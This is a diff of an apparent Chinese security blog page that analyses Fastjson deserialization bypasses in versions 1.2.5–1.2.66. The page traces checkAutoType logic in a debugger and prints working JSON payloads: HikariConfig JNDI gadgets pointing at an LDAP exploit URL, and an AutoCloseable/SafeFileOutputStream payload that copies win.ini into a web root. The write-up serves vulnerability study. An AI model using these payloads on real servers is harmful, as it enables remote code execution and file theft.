+<p><img src="/./pict/image-20240622035455611.png" srcset="/img/loading.gif" lazyload alt="image-20240622035455611"></p>
+<p><img src="/./pict/image-20240622035621233.png" srcset="/img/loading.gif" lazyload alt="image-20240622035621233"></p>
 <h2 id="1-2-5-1-2-61-通杀"><a href="#1-2-5-1-2-61-通杀" class="headerlink" title="1.2.5 - 1.2.61 通杀"></a>1.2.5 - 1.2.61 通杀</h2><h3 id="Fastjson1-2-5"><a href="#Fastjson1-2-5" class="headerlink" title="Fastjson1.2.5 &lt;&#x3D; 1.2.59"></a>Fastjson1.2.5 &lt;&#x3D; 1.2.59</h3><p><strong>需要开启AutoType</strong></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="hljs-string">&quot;healthCheckRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -1948,23 +1948,23 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.62<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-reflect<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <h3 id="调试分析-4"><a href="#调试分析-4" class="headerlink" title="调试分析"></a>调试分析</h3><h4 id="未开启AutoTypeSupport时（无法触发漏洞）"><a href="#未开启AutoTypeSupport时（无法触发漏洞）" class="headerlink" title="未开启AutoTypeSupport时（无法触发漏洞）"></a>未开启AutoTypeSupport时（无法触发漏洞）</h4><p>因为是未开启AutoTypeSupport，先黑名单检测，再白名单检测。前面先进行一些检查，比如之前版本绕过检测的[等字符，会检查一遍。然后950行不会进去，因为我们没有开启AutoTypeSupport</p>
-<p><img src="/../../pict/image-20240622044843596.png" srcset="/img/loading.gif" lazyload alt="image-20240622044843596"></p>
+<p><img src="/./pict/image-20240622044843596.png" srcset="/img/loading.gif" lazyload alt="image-20240622044843596"></p>
 <p>接着会尝试一系列方法进行类加载，从Mapping缓存中加载，调用findClass()来加载，从typeMapping中获取，判断是在internalWhite即内部哈希白名单中，则直接加载。这些加载全都失败，clazz任然为null。</p>
-<p><img src="/../../pict/image-20240622044956115.png" srcset="/img/loading.gif" lazyload alt="image-20240622044956115"></p>
+<p><img src="/./pict/image-20240622044956115.png" srcset="/img/loading.gif" lazyload alt="image-20240622044956115"></p>
 <p>接着黑白名单校验，这个类这个fastjson版本不在黑名单中，所以不会被拦截，当然也不再白名单，任然无法加载</p>
-<p><img src="/../../pict/image-20240622045233340.png" srcset="/img/loading.gif" lazyload alt="image-20240622045233340"></p>
+<p><img src="/./pict/image-20240622045233340.png" srcset="/img/loading.gif" lazyload alt="image-20240622045233340"></p>
 <p>接下来会对其是否开启AutoType、是否注解JsonType、是否设置expectClass来进行判断，如果判断通过，就会判断是否开启AutoType或是否注解JsonType，是的话就会在加载clazz后将其缓存到Mappings中，这正是1.2.47的利用点，也就是说，只要开启了AutoType或者注解了JsonType的话，在这段代码逻辑中就会把clazz缓存到Mappings中，但我们JsonType为false，AutoType也没有开启，无法缓存。</p>
-<p><img src="/../../pict/image-20240622045604515.png" srcset="/img/loading.gif" lazyload alt="image-20240622045604515"></p>
+<p><img src="/./pict/image-20240622045604515.png" srcset="/img/loading.gif" lazyload alt="image-20240622045604515"></p>
 <p>然后抛出异常，所以未开启AutoTypeSupport时，无法触发漏洞。</p>
-<p><img src="/../../pict/image-20240622050004619.png" srcset="/img/loading.gif" lazyload alt="image-20240622050004619"></p>
+<p><img src="/./pict/image-20240622050004619.png" srcset="/img/loading.gif" lazyload alt="image-20240622050004619"></p>
 <h4 id="开启AutoTypeSupport时（触发漏洞）"><a href="#开启AutoTypeSupport时（触发漏洞）" class="headerlink" title="开启AutoTypeSupport时（触发漏洞）"></a>开启AutoTypeSupport时（触发漏洞）</h4><p>前面部分和之前差不多，来到关键部分，因为这次开启了AutoTypeSupport，所以可以进入TypeUtils#loadClass函数加载该类。</p>
-<p><img src="/../../pict/image-20240622050206524.png" srcset="/img/loading.gif" lazyload alt="image-20240622050206524"></p>
+<p><img src="/./pict/image-20240622050206524.png" srcset="/img/loading.gif" lazyload alt="image-20240622050206524"></p>
 <p>通过AppClassLoader类加载器成功加载恶意类，且由于前面开启AutoType的缘故、cacheClass为true进而开启了cache缓存、使得恶意类缓存到了Mapping中，最后返回加载的类，之后跟之前调试第一条链差不多，反序列化该类，触发构造函数，getter或setter方法。</p>
-<p><img src="/../../pict/image-20240622050319340.png" srcset="/img/loading.gif" lazyload alt="image-20240622050319340"></p>
+<p><img src="/./pict/image-20240622050319340.png" srcset="/img/loading.gif" lazyload alt="image-20240622050319340"></p>
 <h4 id="Gadget分析"><a href="#Gadget分析" class="headerlink" title="Gadget分析"></a>Gadget分析</h4><p>就两个方法，那调用的只能是无参构造函数了，并且调用了父类的有参构造函数。</p>
-<p><img src="/../../pict/image-20240622051053200.png" srcset="/img/loading.gif" lazyload alt="image-20240622051053200"></p>
+<p><img src="/./pict/image-20240622051053200.png" srcset="/img/loading.gif" lazyload alt="image-20240622051053200"></p>
 <p>我们PoC中的AsText属性在JndiConverter类中并没有重写该属性的setter方法，但却调用了父类的AbstractConverter类的setAsText()函数来进行setter设置。并且为什么可以确认是这个属性呢，我们的走到jndi的lookup方法，这个方法在toObjectImpl方法里，可以直接找哪里调用了toObjectImpl方法也可以顺着一路找到setAsText()函数。</p>
-<p><img src="/../../pict/image-20240622052052313.png" srcset="/img/loading.gif" lazyload alt="image-20240622052052313"></p>
+<p><img src="/./pict/image-20240622052052313.png" srcset="/img/loading.gif" lazyload alt="image-20240622052052313"></p>
 <h2 id="1-2-66反序列化漏洞（黑名单绕过"><a href="#1-2-66反序列化漏洞（黑名单绕过" class="headerlink" title="1.2.66反序列化漏洞（黑名单绕过"></a>1.2.66反序列化漏洞（黑名单绕过</h2><p>原理都大差不差，cv了一下mi1k7ea的文章作为笔记</p>
 <h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>新Gadget绕过黑名单限制。</p>
 <p>1.2.66涉及多条Gadget链，原理都是存在JDNI注入漏洞。</p>
@@ -2026,26 +2026,26 @@
 
 <p>无需开启AutoType，直接成功绕过<code>CheckAutoType()</code>的检测从而触发执行：</p>
 <h3 id="调试分析-5"><a href="#调试分析-5" class="headerlink" title="调试分析"></a>调试分析</h3><p>直接进checkAutoType函数，我们可以直接从mappings缓存中找到指定的<code>java.lang.AutoCloseable</code>类，</p>
-<p><img src="/../../pict/image-20240622235932240.png" srcset="/img/loading.gif" lazyload alt="image-20240622235932240"></p>
-<p><img src="/../../pict/image-20240623000037832.png" srcset="/img/loading.gif" lazyload alt="image-20240623000037832"></p>
+<p><img src="/./pict/image-20240622235932240.png" srcset="/img/loading.gif" lazyload alt="image-20240622235932240"></p>
+<p><img src="/./pict/image-20240623000037832.png" srcset="/img/loading.gif" lazyload alt="image-20240623000037832"></p>
 <p>往下就是判断clazz是否不是expectClass类的继承类且不是HashMap类型，是的话抛出异常，否则直接返回该类。这里没有expectClass就直接返回<code>java.lang.AutoCloseable</code>类</p>
-<p><img src="/../../pict/image-20240623000121534.png" srcset="/img/loading.gif" lazyload alt="image-20240623000121534"></p>
+<p><img src="/./pict/image-20240623000121534.png" srcset="/img/loading.gif" lazyload alt="image-20240623000121534"></p>
 <p>接着获取<code>java.lang.AutoCloseable</code>这个类的反序列化器，然后调用其deserialze方法开始反序列化。即JavaBeanDeserializer#deserialze</p>
-<p><img src="/../../pict/image-20240623000229903.png" srcset="/img/loading.gif" lazyload alt="image-20240623000229903"></p>
+<p><img src="/./pict/image-20240623000229903.png" srcset="/img/loading.gif" lazyload alt="image-20240623000229903"></p>
 <p>往下的逻辑，就是根据给定的 <code>typeName</code> 获取一个对象反序列化器（<code>ObjectDeserializer</code>），如果该反序列化器不存在，则尝试根据类型信息和配置自动确定一个合适的反序列化器。调用配置对象的 <code>checkAutoType</code> 方法检查和自动确定给定类型名（<code>typeName</code>）是否允许并返回具体的用户类型。<code>expectClass</code> 是期望的类，<code>lexer.getFeatures()</code> 是一些特征或配置选项。</p>
-<p><img src="/../../pict/image-20240623000354413.png" srcset="/img/loading.gif" lazyload alt="image-20240623000354413"></p>
+<p><img src="/./pict/image-20240623000354413.png" srcset="/img/loading.gif" lazyload alt="image-20240623000354413"></p>
 <p>往下，由于java.lang.AutoCloseable类并非其中黑名单中的类，因此expectClassFlag被设置为true</p>
-<p><img src="/../../pict/image-20240623002351962.png" srcset="/img/loading.gif" lazyload alt="image-20240623002351962"></p>
+<p><img src="/./pict/image-20240623002351962.png" srcset="/img/loading.gif" lazyload alt="image-20240623002351962"></p>
 <p>往下，由于expectClassFlag为true且目标类不在内部白名单中，程序进入AutoType开启时的检测逻辑</p>
-<p><img src="/../../pict/image-20240623002712935.png" srcset="/img/loading.gif" lazyload alt="image-20240623002712935"></p>
+<p><img src="/./pict/image-20240623002712935.png" srcset="/img/loading.gif" lazyload alt="image-20240623002712935"></p>
 <p>由于vul.VulAutoCloseable类不在黑白名单中，因此这段能通过检测并继续往下执行。</p>
 <p>往下，未加载成功目标类，就会进入AutoType关闭时的检测逻辑，和上同理，这段能通过检测并继续往下执行</p>
 <p>由于expectClassFlag为true，进入如下的loadClass()逻辑来加载目标类，但是由于AutoType关闭且jsonType为false，因此调用loadClass()函数的时候是不开启cache即缓存的</p>
-<p><img src="/../../pict/image-20240623002958623.png" srcset="/img/loading.gif" lazyload alt="image-20240623002958623"></p>
+<p><img src="/./pict/image-20240623002958623.png" srcset="/img/loading.gif" lazyload alt="image-20240623002958623"></p>
 <p>跟进，使用了AppClassLoader加载vul.VulAutoCloseable类并直接返回加载的类。</p>
-<p><img src="/../../pict/image-20240623003054223.png" srcset="/img/loading.gif" lazyload alt="image-20240623003054223"></p>
+<p><img src="/./pict/image-20240623003054223.png" srcset="/img/loading.gif" lazyload alt="image-20240623003054223"></p>
 <p>往下，判断是否jsonType、true的话直接添加Mapping缓存并返回类，否则接着判断返回的类是否是ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常，这也是过滤大多数JNDI注入Gadget的机制。如果expectClass不为null，则判断目标类是否是expectClass类的子类，是的话就添加到Mapping缓存中并直接返回该目标类，否则直接抛出异常导致利用失败，<strong>这里就解释了为什么恶意类必须要继承AutoCloseable接口类，因为这里expectClass为AutoCloseable类、因此恶意类必须是AutoCloseable类的子类才能通过这里的判断</strong>：</p>
-<p><img src="/../../pict/image-20240623003222449.png" srcset="/img/loading.gif" lazyload alt="image-20240623003222449"></p>
+<p><img src="/./pict/image-20240623003222449.png" srcset="/img/loading.gif" lazyload alt="image-20240623003222449"></p>
 <p>checkAutoType()调用完返回类之后，就进行反序列化操作、新建恶意类实例进而调用其构造函数从而成功触发漏洞</p>
 <p><strong>小结：</strong>当传入checkAutoType()函数的expectClass参数不为null，并且需要加载的目标类是expectClass类的子类或者实现类时（不在黑名单中），就将需要加载的目标类当做是正常的类然后通过调用TypeUtils.loadClass()函数进行加载。</p>
 <h3 id="实战利用"><a href="#实战利用" class="headerlink" title="实战利用"></a>实战利用</h3><p>前面漏洞复现只是简单地验证绕过方法的可行性，在实际的攻击利用中，是需要我们去寻找实际可行的利用类的。</p>
@@ -2055,7 +2055,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;  <br> &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  <br> &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;  <br> &lt;version&gt;<span class="hljs-number">1.9</span><span class="hljs-number">.5</span>&lt;/version&gt;  <br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure>
 
 <p>其<code>SafeFileOutputStream(java.lang.String, java.lang.String)</code>构造函数判断了如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中，可以利用造成任意文件读取。</p>
-<p><img src="/../../pict/image-20240623012122118.png" srcset="/img/loading.gif" lazyload alt="image-20240623012122118"></p>
+<p><img src="/./pict/image-20240623012122118.png" srcset="/img/loading.gif" lazyload alt="image-20240623012122118"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>, <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>, <span class="hljs-string">&quot;tempPath&quot;</span>:<span class="hljs-string">&quot;C:/Windows/win.ini&quot;</span>, <span class="hljs-string">&quot;targetPath&quot;</span>:<span class="hljs-string">&quot;D:/wamp64/www/win.txt&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
 
 <h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><p>写内容类：<strong>com.esotericsoftware.kryo.io.Output</strong></p>
